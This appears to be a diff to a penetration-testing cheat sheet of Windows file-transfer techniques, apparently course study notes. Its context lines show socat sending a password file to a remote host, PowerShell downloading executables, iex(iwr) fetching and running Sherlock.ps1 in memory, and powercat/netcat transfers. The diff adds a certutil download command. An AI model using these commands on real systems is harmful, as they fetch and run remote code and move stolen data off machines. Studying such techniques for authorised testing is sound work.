@@ -51,7 +51,6 @@ socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
 # loads file in memory and runs it
 iex (iwr http://192.168.119.217/Sherlock.ps1 -UseBasicParsing)
-
 ```
 
 ## Powercat
@@ -61,4 +60,10 @@ iex (iwr http://192.168.119.217/Sherlock.ps1 -UseBasicParsing)
 sudo nc -lnvp 443 > receiving_powercat.ps1
 # send a file
 powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+```
+
+## Certutil
+
+```
+certutil.exe -urlcache -f http://<IP>/Sherlock.ps1 Sherlock,ps1
 ```
